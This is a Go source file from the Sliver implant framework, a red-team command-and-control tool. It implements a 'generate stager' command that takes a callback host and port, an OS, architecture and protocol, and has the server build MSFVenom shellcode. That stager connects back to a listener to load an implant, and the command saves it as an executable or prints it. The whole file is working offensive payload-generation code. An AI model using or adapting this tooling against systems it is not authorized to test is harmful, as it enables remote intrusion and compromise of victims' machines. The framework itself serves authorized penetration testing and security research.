package server

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"
	"io/ioutil"
	"net"
	"os"
	"path/filepath"
	"regexp"
	"strings"

	"gopkg.in/AlecAivazis/survey.v1"

	"github.com/bishopfox/sliver/client/spin"
	"github.com/bishopfox/sliver/client/transport"
	"github.com/bishopfox/sliver/protobuf/clientpb"
)

// GenerateStager - Generate a stager payload using MSFVenom
type GenerateStager struct {
	PayloadOptions struct {
		OS       string `long:"os" short:"o" description:"target host operating system" default:"windows" value-name:"stage OS"`
		Arch     string `long:"arch" short:"a" description:"target host CPU architecture" default:"amd64" value-name:"stage architectures"`
		Format   string `long:"msf-format" short:"f" description:"output format (MSF Venom formats). List is auto-completed" default:"raw" value-name:"MSF Venom transform formats"`
		BadChars string `long:"badchars" short:"b" description:"bytes to exclude from stage shellcode"`
		Save     string `long:"save" short:"s" description:"directory to save the generated stager to"`
	} `group:"payload options"`
	TransportOptions struct {
		LHost    string `long:"lhost" short:"l" description:"listening host address" required:"true"`
		LPort    int    `long:"lport" short:"p" description:"listening host port" default:"8443"`
		Protocol string `long:"protocol" short:"P" description:"staging protocol (tcp/http/https)" default:"tcp" value-name:"stager protocol"`
	} `group:"transport options"`
}

// Execute - Generate a stager payload using MSFVenom
func (g *GenerateStager) Execute(args []string) (err error) {
	var stageProto clientpb.StageProtocol
	lhost := g.TransportOptions.LHost
	if lhost == "" {
		fmt.Println(Error + "please specify a listening host")
		return
	}
	match, err := regexp.MatchString(`^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$`, lhost)
	if err != nil {
		return
	}
	if !match {
		addr, err := net.LookupHost(lhost)
		if err != nil {
			fmt.Printf(Error+"Error resolving %s: %v\n", lhost, err)
			return err
		}
		if len(addr) > 1 {
			prompt := &survey.Select{
				Message: "Select an address",
				Options: addr,
			}
			err := survey.AskOne(prompt, &lhost, nil)
			if err != nil {
				fmt.Printf(Error+"Error: %v\n", err)
				return err
			}
		} else {
			lhost = addr[0]
		}
	}
	lport := g.TransportOptions.LPort
	stageOS := g.PayloadOptions.OS
	arch := g.PayloadOptions.Arch
	proto := g.TransportOptions.Protocol
	format := g.PayloadOptions.Format
	badchars := g.PayloadOptions.BadChars
	save := g.PayloadOptions.Save

	bChars := make([]string, 0)
	if len(badchars) > 0 {
		for _, b := range strings.Split(badchars, " ") {
			bChars = append(bChars, fmt.Sprintf("\\x%s", b))
		}
	}

	switch proto {
	case "tcp":
		stageProto = clientpb.StageProtocol_TCP
	case "http":
		stageProto = clientpb.StageProtocol_HTTP
	case "https":
		stageProto = clientpb.StageProtocol_HTTPS
	default:
		fmt.Printf(Error+"%s staging protocol not supported\n", proto)
		return
	}

	ctrl := make(chan bool)
	go spin.Until("Generating stager, please wait ...", ctrl)
	stageFile, err := transport.RPC.MsfStage(context.Background(), &clientpb.MsfStagerReq{
		Arch:     arch,
		BadChars: bChars,
		Format:   format,
		Host:     lhost,
		Port:     uint32(lport),
		Protocol: stageProto,
		OS:       stageOS,
	})
	ctrl <- true
	<-ctrl

	if err != nil {
		fmt.Printf(Error+"Error: %v", err)
		return
	}

	if save != "" || format == "raw" {
		saveTo, _ := filepath.Abs(save)
		fi, err := os.Stat(saveTo)
		if err != nil {
			fmt.Printf(Error+"Failed to generate sliver stager %v\n", err)
			return err
		}
		if fi.IsDir() {
			saveTo = filepath.Join(saveTo, stageFile.GetFile().GetName())
		}
		err = ioutil.WriteFile(saveTo, stageFile.GetFile().GetData(), 0700)
		if err != nil {
			fmt.Printf(Error+"Failed to write to: %s\n", saveTo)
			return err
		}
		fmt.Printf(Info+"Sliver stager saved to: %s\n", saveTo)
	} else {
		fmt.Println(Info + "Here's your stager:")
		fmt.Println(string(stageFile.GetFile().GetData()))
	}

	return
}
